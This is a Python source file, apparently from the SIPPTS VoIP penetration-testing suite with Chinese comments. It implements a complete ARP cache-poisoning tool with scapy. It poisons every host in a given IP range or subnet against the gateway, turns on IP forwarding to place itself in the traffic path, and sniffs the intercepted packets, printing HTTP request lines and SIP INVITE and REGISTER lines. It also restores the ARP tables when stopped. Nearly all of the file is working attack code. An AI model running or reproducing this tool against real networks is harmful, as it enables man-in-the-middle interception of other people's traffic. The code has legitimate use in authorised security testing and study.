#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"


from scapy.all import Ether, ARP, srp, send, IP, TCP, UDP, Raw, sniff
import time
import signal
import os
import ipaddress
import threading
import platform
import socket
import netifaces
from IPy import IP as IPy_IP
from .lib.functions import (
    get_machine_default_ip,
    ip2long,
    get_default_gateway_linux,
    get_default_gateway_mac,
    get_default_gateway_windows,
    enable_ip_route,
    disable_ip_route,
    ip2long,
    long2ip,
)
from .lib.color import Color
from .lib.logos import Logo
import struct


class ArpSpoof:
    def __init__(self, callback=None):
        self.ip = "-"
        self.gw = ""
        self.verbose = 0
        self.file = ""
        self.ips = []
        self.dropped_ips = []
        self.active_targets = {}  # 用于跟踪活跃的目标 {ip: mac}

        self.run = True
        self.callback = callback  # 用于向UI发送消息的回调函数

        # 数据包监控相关
        self.monitor_thread = None
        self.stop_monitor = False
        self.interface = None
        self.monitor_enabled = False

        self.c = Color()

    def log_message(self, message):
        """向UI发送日志消息"""
        if self.callback:
            self.callback(message)
        else:
            print(message)

    def signal_handler(self, sig, frame):
        print(f"{self.c.BYELLOW}You pressed Ctrl+C!\n{self.c.WHITE}")
        print(f"{self.c.BWHITE}Restoring ARP tables ...")
        print(self.c.WHITE)

        self.stop()

    def start(self):
        # 获取当前用户
        current_user = os.popen("whoami").read().strip()
        ops = platform.system()

        try:
            self.verbose == int(self.verbose)
        except:
            self.verbose = 0

        # 检查权限
        if ops == "Linux" and current_user != "root":
            msg = f"{self.c.WHITE}You must be {self.c.RED}root{self.c.WHITE} to use this module"
            print(msg)
            return
        
        # 获取本机IP地址
        try:
            if self.interface:
                # 如果指定了接口，获取该接口的IP地址
                print(f"{self.c.BWHITE}[✓] 使用网络接口: {self.c.GREEN}{self.interface}")
                try:
                    addrs = netifaces.ifaddresses(self.interface)
                    if netifaces.AF_INET in addrs:
                        local_ip = addrs[netifaces.AF_INET][0]['addr']
                        # 获取本机MAC地址
                        if netifaces.AF_LINK in addrs:
                            local_mac = addrs[netifaces.AF_LINK][0]['addr']
                            print(f"{self.c.BWHITE}[✓] 本机MAC地址: {self.c.GREEN}{local_mac}")
                        else:
                            local_mac = None
                            print(f"{self.c.YELLOW}[!] 无法获取本机MAC地址")
                        
                        print(f"{self.c.BWHITE}[✓] 本地IP地址: {self.c.GREEN}{local_ip}")
                    else:
                        # 如果指定接口没有IPv4地址，回退到默认方法
                        local_ip = get_machine_default_ip()
                        local_mac = None
                        print(f"{self.c.BWHITE}[✓] 指定接口没有IPv4地址，回退到默认方法获取本地IP地址: {self.c.GREEN}{local_ip}")
                except Exception as e:
                    print(f"{self.c.YELLOW}[!] 获取接口IP出错: {str(e)}")
                    local_ip = get_machine_default_ip()
                    local_mac = None
            else:
                # 未指定接口，使用默认方法获取IP
                local_ip = get_machine_default_ip()
                local_mac = None
                print(f"{self.c.BWHITE}[✓] 未指定接口，使用默认方法获取IP: {self.c.GREEN}{local_ip}")
        except Exception as e:
            msg = f"{self.c.BRED}Error getting local IP: {str(e)}"
            print(msg)
            print(self.c.WHITE)
            return

        # 获取网关地址
        if self.gw == "":
            if ops == "Linux":
                self.gw = get_default_gateway_linux()
            elif ops == "Darwin":
                self.gw = get_default_gateway_mac().strip()
            elif ops == "Windows":
                self.gw = get_default_gateway_windows()
        
        print(f"{self.c.BWHITE}[✓] 网关: {self.c.GREEN}{self.gw}")
        # 获取网关MAC地址
        gateway_mac = self.get_mac(self.gw)
        if gateway_mac:
            print(f"{self.c.BWHITE}[✓] 网关MAC地址: {self.c.GREEN}{gateway_mac}")
        else:
            print(f"{self.c.RED}[!] 无法获取网关MAC地址，请检查网络连接")
            
        print(f"{self.c.BWHITE}[✓] 操作系统: {self.c.GREEN}{ops}")
        print(f"{self.c.BWHITE}[✓] 当前用户: {self.c.GREEN}{current_user}")
        print(f"{self.c.BWHITE}[✓] 本地IP地址: {self.c.GREEN}{local_ip}")
        if self.file != "" and self.ip == None:
            print(
                f"{self.c.BWHITE}[✓] 目标IP/网段: {self.c.GREEN}In file '{self.file}"
            )
        else:
            print(f"{self.c.BWHITE}[✓] 目标IP/网段: {self.c.GREEN}{self.ip}")
        print(f"{self.c.BWHITE}[✓] 网关: {self.c.GREEN}{self.gw}")
        print(self.c.WHITE)

        # 启用IP转发
        enable_ip_route()
        
        # 解析目标IP列表
        target_ips = []
        
        # 从文件读取IP
        if self.file != "":
            try:
                with open(self.file) as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                            
                        try:
                            # 尝试解析IP/网段
                            if line.find("-") > 0:  # IP范围 (例如 192.168.1.1-192.168.1.10)
                                start_ip, end_ip = line.split("-")
                                ipini = int(ip2long(start_ip))
                                ipend = int(ip2long(end_ip))
                                
                                for i in range(ipini, ipend + 1):
                                    ip = long2ip(i)
                                    if ip != local_ip and ip != self.gw:
                                        target_ips.append(ip)
                            elif line.find("/") > 0:  # CIDR表示法 (例如 192.168.1.0/24)
                                network = ipaddress.ip_network(line, strict=False)
                                for ip in network.hosts():
                                    if str(ip) != local_ip and str(ip) != self.gw:
                                        target_ips.append(str(ip))
                            else:  # 单个IP
                                ip = socket.gethostbyname(line)
                                if ip != local_ip and ip != self.gw:
                                    target_ips.append(ip)
                        except Exception as e:
                            if self.verbose > 0:
                                print(f"{self.c.YELLOW}[!] 解析IP出错 '{line}': {str(e)}")
                            continue
                            
                f.close()
            except Exception as e:
                print(f"{self.c.RED}Error reading file {self.file}: {str(e)}")
                return
        else:
            # 直接从参数解析IP
            for ip_item in self.ip.split(","):
                try:
                    if ip_item.find("-") > 0:  # IP范围
                        start_ip, end_ip = ip_item.split("-")
                        ipini = int(ip2long(start_ip))
                        ipend = int(ip2long(end_ip))
                        
                        for i in range(ipini, ipend + 1):
                            ip = long2ip(i)
                            if ip != local_ip and ip != self.gw:
                                target_ips.append(ip)
                    elif ip_item.find("/") > 0:  # CIDR表示法
                        network = ipaddress.ip_network(ip_item, strict=False)
                        for ip in network.hosts():
                            if str(ip) != local_ip and str(ip) != self.gw:
                                target_ips.append(str(ip))
                    else:  # 单个IP
                        ip = socket.gethostbyname(ip_item)
                        if ip != local_ip and ip != self.gw:
                            target_ips.append(ip)
                except Exception as e:
                    if self.verbose > 0:
                        print(f"{self.c.YELLOW}[!] 解析IP出错 '{ip_item}': {str(e)}")
                    continue
        
        # 检查是否找到目标IP
        if not target_ips:
            print(f"{self.c.RED}\n未找到任何目标IP")
            print(self.c.WHITE)
            return
            
        # 显示找到的目标IP数量
        print(f"{self.c.BWHITE}[✓] 找到 {self.c.GREEN}{len(target_ips)}{self.c.BWHITE} 个目标IP")
        
        # 获取每个目标IP的MAC地址
        target_data = []
        for ip in target_ips:
            mac = self.get_mac(ip)
            if mac:
                target_data.append((ip, mac))
                # 添加到活跃目标字典
                self.active_targets[ip] = mac
                if self.verbose > 0:
                    print(f"{self.c.BWHITE}[✓] 目标: {self.c.GREEN}{ip} {self.c.BWHITE}MAC: {self.c.GREEN}{mac}")
            else:
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[!] 无法获取 {ip} 的MAC地址，跳过此目标")
        
        if not target_data:
            print(f"{self.c.RED}\n无法获取任何目标MAC地址，请检查网络连接")
            print(self.c.WHITE)
            return
            
        # 开始ARP欺骗过程
        self.run = True
        threads = []
        
        # 如果开启了监控且提供了接口，启动监控
        if self.monitor_enabled and self.interface:
            self.start_monitor()
        
        # 为每个目标创建一个线程
        for ip, mac in target_data:
            print(f"{self.c.YELLOW}[+] 开始ARP欺骗: {self.c.GREEN}{ip} {self.c.YELLOW}(MAC: {self.c.GREEN}{mac}{self.c.YELLOW})")
            t = threading.Thread(
                target=self.start_spoof,
                args=(ip, self.gw, mac, self.verbose),
                daemon=True,
            )
            threads.append(t)
            t.start()
            time.sleep(0.1)
        
        # 等待所有线程完成
        for t in threads:
            t.join()

    def stop(self):
        """停止ARP欺骗并恢复网络"""
        print(f"{self.c.BWHITE}\n正在恢复ARP表...")
        print(self.c.WHITE)

        # 获取本机IP地址
        try:
            if self.interface and netifaces.AF_INET in netifaces.ifaddresses(self.interface):
                local_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
            else:
                local_ip = get_machine_default_ip()
        except:
            local_ip = get_machine_default_ip()

        self.run = False
        
        # 获取所有已经欺骗的目标
        print(f"{self.c.YELLOW}[!] 开始恢复所有ARP表...")
        
        # 恢复当前正在欺骗的所有IP
        for ip, mac in self.active_targets.items():
            if ip != local_ip and ip != self.gw:
                try:
                    self.restore(ip, self.gw, self.verbose)
                    print(f"{self.c.GREEN}[✓] 已恢复 {ip} 的ARP表")
                except Exception as e:
                    print(f"{self.c.RED}[!] 恢复 {ip} 的ARP表时出错: {str(e)}")
        
        # 恢复网关的ARP表
        try:
            self.restore(self.gw, local_ip, self.verbose)
            print(f"{self.c.GREEN}[✓] 已恢复网关 {self.gw} 的ARP表")
        except Exception as e:
            print(f"{self.c.RED}[!] 恢复网关 {self.gw} 的ARP表时出错: {str(e)}")

        # 停止监控
        self.stop_monitoring()

        # 禁用IP转发
        disable_ip_route()
        
        print(f"{self.c.GREEN}[✓] ARP欺骗已停止，网络已恢复正常{self.c.WHITE}")

    def get_mac(self, ip):
        """
        获取指定IP的MAC地址，通过多种方法尝试提高成功率
        
        参数:
            ip: 目标IP地址
            
        返回:
            成功返回MAC地址字符串，失败返回None
        """
        if self.verbose > 0:
            print(f"{self.c.BWHITE}[*] 开始获取MAC地址: {ip}{self.c.WHITE}")
            
        # 1. 首先检查缓存
        if self.verbose > 0:
            print(f"{self.c.YELLOW}[1] 检查MAC地址缓存...{self.c.WHITE}")
        if hasattr(self, 'mac_cache') and ip in self.mac_cache:
            if self.verbose > 0:
                print(f"{self.c.GREEN}[✓] 从缓存获取MAC地址: {ip} -> {self.mac_cache[ip]}{self.c.WHITE}")
            return self.mac_cache[ip]
        
        # 如果没有缓存属性，初始化它
        if not hasattr(self, 'mac_cache'):
            self.mac_cache = {}
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[*] 初始化MAC地址缓存{self.c.WHITE}")
        
        mac_address = None
        
        # 2. 尝试从接口信息中获取本机和网关MAC
        if self.verbose > 0:
            print(f"{self.c.YELLOW}[2] 尝试从网络接口获取MAC地址...{self.c.WHITE}")
        try:
            # 检查是否为本机IP或网关
            if self.interface:
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 检查接口 {self.interface} 的地址信息{self.c.WHITE}")
                addrs = netifaces.ifaddresses(self.interface)
                # 检查是否为本机IP
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        if addr.get('addr') == ip and netifaces.AF_LINK in addrs:
                            mac_address = addrs[netifaces.AF_LINK][0]['addr']
                            if self.verbose > 0:
                                print(f"{self.c.GREEN}[✓] 获取到本机MAC地址: {mac_address}{self.c.WHITE}")
                            self.mac_cache[ip] = mac_address
                            return mac_address
                elif self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 接口 {self.interface} 没有IPv4地址{self.c.WHITE}")
        except Exception as e:
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[!] 从接口获取MAC地址出错: {str(e)}{self.c.WHITE}")
        
        # 3. 尝试使用netsh命令(Windows)或ip命令(Linux)
        if self.verbose > 0:
            print(f"{self.c.YELLOW}[3] 尝试使用系统命令获取MAC地址...{self.c.WHITE}")
        try:
            if platform.system() == "Windows":
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 在Windows系统上使用netsh命令{self.c.WHITE}")
                import subprocess
                # 使用netsh命令，更现代的方法
                output = subprocess.check_output(f"netsh interface ipv4 show neighbors", 
                                              shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for line in output.splitlines():
                    if ip in line:
                        parts = line.split()
                        # 查找MAC地址格式的部分
                        for part in parts:
                            if len(part) == 17 and part.count('-') == 5:  # xx-xx-xx-xx-xx-xx 格式
                                mac_address = part.replace('-', ':')
                                if mac_address != "ff:ff:ff:ff:ff:ff":
                                    self.mac_cache[ip] = mac_address
                                    if self.verbose > 0:
                                        print(f"{self.c.GREEN}[✓] 通过netsh获取MAC地址: {ip} -> {mac_address}{self.c.WHITE}")
                                    return mac_address
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] netsh命令未找到MAC地址{self.c.WHITE}")
            elif platform.system() in ["Linux", "Darwin"]:
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 在{platform.system()}系统上使用ip neigh命令{self.c.WHITE}")
                import subprocess
                # 使用ip neigh命令，更现代的方法
                try:
                    output = subprocess.check_output(["ip", "neigh", "show", ip], 
                                                 stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                    for line in output.splitlines():
                        if ip in line and "lladdr" in line:
                            parts = line.split()
                            mac_index = parts.index("lladdr") + 1
                            if mac_index < len(parts):
                                mac_address = parts[mac_index]
                                if mac_address != "ff:ff:ff:ff:ff:ff":
                                    self.mac_cache[ip] = mac_address
                                    if self.verbose > 0:
                                        print(f"{self.c.GREEN}[✓] 通过ip neigh获取MAC地址: {ip} -> {mac_address}{self.c.WHITE}")
                                    return mac_address
                    if self.verbose > 0:
                        print(f"{self.c.YELLOW}[*] ip neigh命令未找到MAC地址{self.c.WHITE}")
                except:
                    if self.verbose > 0:
                        print(f"{self.c.YELLOW}[*] ip neigh命令执行失败，可能不支持{self.c.WHITE}")
                    pass  # 可能没有ip命令，继续尝试其他方法
        except Exception as e:
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[!] 使用系统命令获取MAC地址出错: {str(e)}{self.c.WHITE}")
        
        # 4. 尝试使用系统ARP缓存表获取MAC地址
        if self.verbose > 0:
            print(f"{self.c.YELLOW}[4] 尝试从系统ARP缓存表获取MAC地址...{self.c.WHITE}")
        try:
            if platform.system() == "Windows":
                # Windows系统
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 在Windows系统上使用arp -a命令{self.c.WHITE}")
                import subprocess
                output = subprocess.check_output(f"arp -a {ip}", 
                                             shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for line in output.splitlines():
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            mac_address = parts[1].replace('-', ':')
                            if mac_address != "ff:ff:ff:ff:ff:ff" and ":" in mac_address:
                                self.mac_cache[ip] = mac_address
                                if self.verbose > 0:
                                    print(f"{self.c.GREEN}[✓] 从ARP表获取MAC地址: {ip} -> {mac_address}{self.c.WHITE}")
                                return mac_address
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] arp -a命令未找到MAC地址{self.c.WHITE}")
            else:
                # Linux/Mac系统
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 在{platform.system()}系统上使用arp -n命令{self.c.WHITE}")
                import subprocess
                output = subprocess.check_output(f"arp -n {ip}", 
                                             shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for line in output.splitlines():
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            mac_address = parts[2]
                            if mac_address != "ff:ff:ff:ff:ff:ff" and ":" in mac_address:
                                self.mac_cache[ip] = mac_address
                                if self.verbose > 0:
                                    print(f"{self.c.GREEN}[✓] 从ARP表获取MAC地址: {ip} -> {mac_address}{self.c.WHITE}")
                                return mac_address
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] arp -n命令未找到MAC地址{self.c.WHITE}")
        except Exception as e:
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[!] 从ARP表获取MAC地址出错: {str(e)}{self.c.WHITE}")
            
        # 5. 先尝试发送ICMP包来刷新ARP缓存
        if self.verbose > 0:
            print(f"{self.c.YELLOW}[5] 尝试发送ICMP请求刷新ARP缓存...{self.c.WHITE}")
        try:
            import subprocess
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[*] 正在发送ICMP请求刷新ARP缓存: {ip}{self.c.WHITE}")
                
            if platform.system() == "Windows":
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 在Windows系统上使用ping -n 1命令{self.c.WHITE}")
                subprocess.call(["ping", "-n", "1", "-w", "500", ip], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 在{platform.system()}系统上使用ping -c 1命令{self.c.WHITE}")
                subprocess.call(["ping", "-c", "1", "-W", "1", ip], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            # 再次尝试从ARP表获取
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[*] ICMP请求后再次检查ARP表{self.c.WHITE}")
            if platform.system() == "Windows":
                output = subprocess.check_output(f"arp -a {ip}", 
                                             shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for line in output.splitlines():
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            mac_address = parts[1].replace('-', ':')
                            if mac_address != "ff:ff:ff:ff:ff:ff" and ":" in mac_address:
                                self.mac_cache[ip] = mac_address
                                if self.verbose > 0:
                                    print(f"{self.c.GREEN}[✓] ICMP后从ARP表获取MAC地址: {ip} -> {mac_address}{self.c.WHITE}")
                                return mac_address
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] ICMP后arp -a命令仍未找到MAC地址{self.c.WHITE}")
            else:
                output = subprocess.check_output(f"arp -n {ip}", 
                                             shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for line in output.splitlines():
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            mac_address = parts[2]
                            if mac_address != "ff:ff:ff:ff:ff:ff" and ":" in mac_address:
                                self.mac_cache[ip] = mac_address
                                if self.verbose > 0:
                                    print(f"{self.c.GREEN}[✓] ICMP后从ARP表获取MAC地址: {ip} -> {mac_address}{self.c.WHITE}")
                                return mac_address
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] ICMP后arp -n命令仍未找到MAC地址{self.c.WHITE}")
        except Exception as e:
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[!] ICMP刷新ARP表出错: {str(e)}{self.c.WHITE}")
        
        # 6. 使用scapy发送ARP请求
        if self.verbose > 0:
            print(f"{self.c.YELLOW}[6] 尝试使用scapy发送ARP请求...{self.c.WHITE}")
            print(f"{self.c.YELLOW}[*] 正在使用scapy ARP请求获取MAC: {ip}{self.c.WHITE}")
            
        max_attempts = 3  # 最大尝试次数
        timeouts = [0.8, 1.5, 2.5]  # 递增超时时间
        
        # 如果指定了接口，使用它
        iface = self.interface if hasattr(self, 'interface') and self.interface else None
        if self.verbose > 0 and iface:
            print(f"{self.c.YELLOW}[*] 使用网络接口: {iface}{self.c.WHITE}")
        
        for i in range(max_attempts):
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[*] scapy ARP请求尝试 {i+1}/{max_attempts}, 超时: {timeouts[i]}秒{self.c.WHITE}")
            try:
                # 尝试使用不同配置的ARP请求
                if i == 0:
                    # 标准ARP请求
                    if self.verbose > 0:
                        print(f"{self.c.YELLOW}[*] 发送标准ARP请求{self.c.WHITE}")
                    ans, _ = srp(
                        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), 
                        timeout=timeouts[i], 
                        verbose=0,
                        retry=1,
                        iface=iface
                    )
                elif i == 1:
                    # 带有op=1(who-has)的显式请求
                    if self.verbose > 0:
                        print(f"{self.c.YELLOW}[*] 发送显式who-has ARP请求{self.c.WHITE}")
                    ans, _ = srp(
                        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, op=1), 
                        timeout=timeouts[i], 
                        verbose=0,
                        retry=2,
                        iface=iface
                    )
                else:
                    # 最后尝试：明确设置hwlen和plen
                    if self.verbose > 0:
                        print(f"{self.c.YELLOW}[*] 发送带有明确hwlen和plen的ARP请求{self.c.WHITE}")
                    ans, _ = srp(
                        Ether(dst="ff:ff:ff:ff:ff:ff") / 
                        ARP(pdst=ip, op=1, hwlen=6, plen=4), 
                        timeout=timeouts[i], 
                        verbose=0,
                        retry=2,
                        iface=iface
                    )
                
                if ans:
                    mac_address = ans[0][1].src
                    self.mac_cache[ip] = mac_address  # 缓存结果
                    if self.verbose > 0:
                        print(f"{self.c.GREEN}[✓] scapy获取MAC地址: {ip} -> {mac_address} (尝试 {i+1}/{max_attempts}){self.c.WHITE}")
                    return mac_address
                elif self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] scapy ARP请求未收到响应 (尝试 {i+1}/{max_attempts}){self.c.WHITE}")
            except Exception as e:
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[!] scapy获取MAC地址出错 (尝试 {i+1}/{max_attempts}): {str(e)}{self.c.WHITE}")
        
        # 7. 所有方法都失败，检查是否为非本地网络
        if self.verbose > 0:
            print(f"{self.c.YELLOW}[7] 检查目标是否在同一子网...{self.c.WHITE}")
        try:
            # 获取本机IP和掩码
            if self.interface and netifaces.AF_INET in netifaces.ifaddresses(self.interface):
                local_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
                netmask = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['netmask']
                
                if self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] 本机IP: {local_ip}, 子网掩码: {netmask}{self.c.WHITE}")
                
                # 检查目标IP是否在同一子网
                if not self._is_same_subnet(ip, local_ip, netmask):
                    if self.verbose > 0:
                        print(f"{self.c.YELLOW}[*] {ip} 不在同一子网，尝试使用网关MAC{self.c.WHITE}")
                    # 非同一子网，尝试使用已缓存的网关MAC，避免递归调用
                    if hasattr(self, 'gw') and self.gw and hasattr(self, 'mac_cache') and self.gw in self.mac_cache:
                        gw_mac = self.mac_cache[self.gw]
                        if self.verbose > 0:
                            print(f"{self.c.YELLOW}[!] {ip} 不在同一子网，使用缓存的网关MAC: {gw_mac}{self.c.WHITE}")
                        self.mac_cache[ip] = gw_mac
                        return gw_mac
                    elif self.verbose > 0:
                        print(f"{self.c.YELLOW}[*] 网关MAC未缓存，无法用于非本地网络目标{self.c.WHITE}")
                elif self.verbose > 0:
                    print(f"{self.c.YELLOW}[*] {ip} 在同一子网内{self.c.WHITE}")
        except Exception as e:
            if self.verbose > 0:
                print(f"{self.c.YELLOW}[!] 子网检查出错: {str(e)}{self.c.WHITE}")
        
        # 所有方法都失败
        if self.verbose > 0:
            print(f"{self.c.RED}[!] 无法获取 {ip} 的MAC地址，所有方法均已尝试{self.c.WHITE}")
        return None
        
    def _is_same_subnet(self, ip1, ip2, netmask):
        """
        检查两个IP是否在同一子网
        
        参数:
            ip1: 第一个IP地址
            ip2: 第二个IP地址
            netmask: 子网掩码
        """
        try:
            # 转换为整数进行比较
            ip1_int = struct.unpack("!I", socket.inet_aton(ip1))[0]
            ip2_int = struct.unpack("!I", socket.inet_aton(ip2))[0]
            netmask_int = struct.unpack("!I", socket.inet_aton(netmask))[0]
            
            # 检查网络部分是否相同
            return (ip1_int & netmask_int) == (ip2_int & netmask_int)
        except:
            return False

    def spoof(self, target_ip, host_ip, target_mac, verbose=1):
        """
        欺骗 `target_ip` 让它认为我们是 `host_ip`
        这是通过修改目标的ARP缓存实现的（毒化）
        
        参数:
            target_ip: 目标IP地址
            host_ip: 我们要伪装的IP地址
            target_mac: 目标MAC地址
            verbose: 详细程度
        """
        # 构建ARP 'is-at' 操作包，即ARP响应
        # 默认情况下，'hwsrc'（源MAC地址）是本机的实际MAC地址
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
        # 发送数据包
        send(arp_response, verbose=0)
        if verbose == 2:
            # 获取我们正在使用的默认接口的MAC地址
            self_mac = ARP().hwsrc
            msg = f"{self.c.YELLOW}[+] 发送欺骗包到 {target_ip}: {host_ip} is-at {self_mac}{self.c.WHITE}"
            print(msg)

    def restore(self, target_ip, host_ip, verbose=1):
        """
        恢复正常网络通信
        这是通过发送原始信息（网关的真实IP和MAC）给目标主机来完成的
        
        参数:
            target_ip: 目标IP地址
            host_ip: 主机IP地址（网关）
            verbose: 详细程度
        """
        # 获取目标的真实MAC地址
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            if verbose > 0:
                print(f"{self.c.YELLOW}[!] 无法获取 {target_ip} 的MAC地址，跳过恢复{self.c.WHITE}")
            return
            
        # 获取伪装主机（即网关）的真实MAC地址
        host_mac = self.get_mac(host_ip)
        if not host_mac:
            if verbose > 0:
                print(f"{self.c.YELLOW}[!] 无法获取 {host_ip} 的MAC地址，跳过恢复{self.c.WHITE}")
            return
            
        # 构建恢复数据包
        arp_response = ARP(
            pdst=target_ip,   # 目标IP
            hwdst=target_mac, # 目标MAC
            psrc=host_ip,     # 源IP（网关）
            hwsrc=host_mac,   # 源MAC（网关的真实MAC）
            op="is-at"        # ARP应答
        )
        # 发送恢复数据包
        # 为确保恢复成功，发送7次
        send(arp_response, verbose=0, count=7)
        if verbose > 0:
            msg = f"{self.c.GREEN}[-] 发送恢复包到 {target_ip}: {host_ip} is-at {host_mac}{self.c.WHITE}"
            print(msg)

    def start_spoof(self, target_ip, gw_ip, target_mac, verbose):
        """启动ARP欺骗
        
        参数:
            target_ip: 目标IP地址
            gw_ip: 网关IP地址
            target_mac: 目标MAC地址
            verbose: 详细程度
        """
        if verbose > 0:
            # 获取网关MAC地址
            gw_mac = self.get_mac(gw_ip)

            if target_mac == None:
                msg = f"{self.c.RED}[!] Error getting the target MAC address for IP: {target_ip}{self.c.WHITE}"
                print(msg)
                self.dropped_ips.append(target_ip)
                return
            if gw_mac == None:
                msg = f"{self.c.RED}[!] Error getting the target MAC address for IP: {gw_ip}{self.c.WHITE}"
                print(msg)
                return

            msg = f"{self.c.YELLOW}[+] Start ARP spoof between {target_ip} ({target_mac}) and {gw_ip} ({gw_mac}){self.c.WHITE}"
            print(msg)

        while self.run == True:
            # 告诉目标主机我们是网关
            self.spoof(target_ip, gw_ip, target_mac, verbose)
            # 告诉网关我们是目标主机
            self.spoof(gw_ip, target_ip, gw_mac, verbose)
            # 休眠1秒
            time.sleep(1)

    def start_monitor(self):
        """启动数据包监控"""
        self.stop_monitor = False
        
        if self.monitor_thread is None or not self.monitor_thread.is_alive():
            print("开始监控网络流量...")
            self.monitor_thread = threading.Thread(target=self._monitor_packets, daemon=True)
            self.monitor_thread.start()
    
    def stop_monitoring(self):
        """停止数据包监控"""
        self.stop_monitor = True
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(2)  # 等待最多2秒
    
    def _monitor_packets(self):
        """监控数据包"""
        # 使用scapy的sniff函数监控数据包
        try:
            sniff(prn=self._process_packet, 
                  store=0, 
                  stop_filter=lambda p: self.stop_monitor,
                  iface=self.interface)
        except Exception as e:
            print(f"监控网络流量时出错: {str(e)}")
    
    def _process_packet(self, packet):
        """处理捕获的数据包"""
        # 只处理IP数据包
        if IP in packet:
            summary = []
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            proto = "???"
            info = ""
            
            # 检查是否为TCP/UDP数据包
            if TCP in packet:
                proto = "TCP"
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                
                # 检查常见协议
                if dst_port == 80 or src_port == 80:
                    proto = "HTTP"
                elif dst_port == 443 or src_port == 443:
                    proto = "HTTPS"
                elif dst_port == 21 or src_port == 21:
                    proto = "FTP"
                elif dst_port == 22 or src_port == 22:
                    proto = "SSH"
                elif dst_port == 25 or src_port == 25:
                    proto = "SMTP"
                
                # TCP标志
                flags = ""
                if packet[TCP].flags.S:
                    flags += "SYN "
                if packet[TCP].flags.A:
                    flags += "ACK "
                if packet[TCP].flags.F:
                    flags += "FIN "
                if packet[TCP].flags.R:
                    flags += "RST "
                if packet[TCP].flags.P:
                    flags += "PSH "
                
                info = f"{src_ip}:{src_port} -> {dst_ip}:{dst_port} [{flags.strip()}]"
                
                # 检查HTTP内容
                if proto == "HTTP" and Raw in packet:
                    try:
                        http_data = packet[Raw].load.decode('utf-8', errors='ignore')
                        if "GET " in http_data or "POST " in http_data:
                            first_line = http_data.split('\r\n')[0]
                            info += f" {first_line}"
                    except:
                        pass
                
            elif UDP in packet:
                proto = "UDP"
                src_port = packet[UDP].sport
                dst_port = packet[UDP].dport
                
                # 检查常见协议
                if dst_port == 53 or src_port == 53:
                    proto = "DNS"
                elif dst_port == 161 or src_port == 161:
                    proto = "SNMP"
                elif (dst_port == 5060 or src_port == 5060) and Raw in packet:
                    proto = "SIP"
                
                info = f"{src_ip}:{src_port} -> {dst_ip}:{dst_port}"
                
                # 检查SIP内容
                if proto == "SIP" and Raw in packet:
                    try:
                        sip_data = packet[Raw].load.decode('utf-8', errors='ignore')
                        if "INVITE " in sip_data or "REGISTER " in sip_data or "OPTIONS " in sip_data:
                            first_line = sip_data.split('\r\n')[0]
                            info += f" {first_line}"
                    except:
                        pass
            
            # 将捕获的信息发送给回调
            if info:
                print(f"[{proto}] {info}")
